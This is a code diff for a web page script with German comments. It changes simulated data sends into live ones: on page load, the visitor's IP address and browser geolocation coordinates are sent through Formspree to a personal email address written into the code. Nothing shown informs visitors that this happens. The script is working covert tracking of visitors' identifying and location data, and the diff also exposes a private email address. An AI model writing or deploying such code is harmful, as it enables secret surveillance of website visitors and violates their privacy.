@@ -12,29 +12,36 @@ function sendIPOnPageLoad() {
             const ipAddress = data.ip;
             console.log("Benutzer IP-Adresse:", ipAddress);
 
-            // IP-Adresse an den Server senden (z.B. via Fetch)
-            sendIPByEmail(ipAddress);
+            // IP-Adresse an den Server senden (via Formspree)
+            sendIPToFormspree(ipAddress);
         })
         .catch(error => {
             console.error("Fehler beim Abrufen der IP-Adresse:", error);
         });
 }
 
-// Funktion zum Senden der IP-Adresse per E-Mail (simuliert)
-function sendIPByEmail(ipAddress) {
-    const ipData = { ip: ipAddress };
+// Funktion, um die IP-Adresse an Formspree zu senden
+function sendIPToFormspree(ipAddress) {
+    const formData = new FormData();
+    formData.append("email", "nejat.balta@outlook.de");  // Empfänger E-Mail-Adresse
+    formData.append("subject", "Neue IP-Adresse");
+    formData.append("message", `Die IP-Adresse des Besuchers: ${ipAddress}`);
 
-    // Beispiel: Senden der IP-Adresse an den Server (kannst du anpassen)
-    console.log("IP-Adresse senden:", ipData);
-
-    // Hier eine Fetch-Anfrage zum Senden der IP-Adresse an deinen Server (optional anpassen)
-    // fetch('/send-ip', {
-    //     method: 'POST',
-    //     body: JSON.stringify(ipData),
-    //     headers: {
-    //         'Content-Type': 'application/json',
-    //     },
-    // });
+    // Sende die Daten an Formspree
+    fetch("https://formspree.io/f/mpwplqao", {
+        method: "POST",
+        body: formData
+    })
+    .then(response => {
+        if (response.ok) {
+            console.log("IP-Adresse erfolgreich gesendet");
+        } else {
+            console.error("Fehler beim Senden der IP-Adresse");
+        }
+    })
+    .catch(error => {
+        console.error("Fehler beim Senden an Formspree:", error);
+    });
 }
 
 // Funktion für den Standort (geografische Koordinaten) und deren Versenden
@@ -57,23 +64,33 @@ function sendLocationByEmail(position) {
     const lat = position.coords.latitude;
     const lon = position.coords.longitude;
 
-    // Standortdaten an den Server senden
-    const locationData = {
-        latitude: lat,
-        longitude: lon
-    };
+    // Standortdaten an den Server senden (via Formspree)
+    const locationData = `Breitengrad: ${lat}, Längengrad: ${lon}`;
+    sendLocationToFormspree(locationData);
+}
 
-    // Beispiel: Senden der Standortdaten an den Server (kannst du anpassen)
-    console.log("Standortdaten senden:", locationData);
+// Funktion, um Standortdaten an Formspree zu senden
+function sendLocationToFormspree(locationData) {
+    const formData = new FormData();
+    formData.append("email", "nejat.balta@outlook.de");  // Empfänger E-Mail-Adresse
+    formData.append("subject", "Standortdaten des Besuchers");
+    formData.append("message", `Die Koordinaten des Besuchers: ${locationData}`);
 
-    // Hier eine Fetch-Anfrage zum Senden der Koordinaten an deinen Server
-    // fetch('/send-location', {
-    //     method: 'POST',
-    //     body: JSON.stringify(locationData),
-    //     headers: {
-    //         'Content-Type': 'application/json',
-    //     },
-    // });
+    // Sende die Daten an Formspree
+    fetch("https://formspree.io/f/mpwplqao", {
+        method: "POST",
+        body: formData
+    })
+    .then(response => {
+        if (response.ok) {
+            console.log("Standortdaten erfolgreich gesendet");
+        } else {
+            console.error("Fehler beim Senden der Standortdaten");
+        }
+    })
+    .catch(error => {
+        console.error("Fehler beim Senden an Formspree:", error);
+    });
 }
 
 // Fehlerbehandlung für den Standortabruf
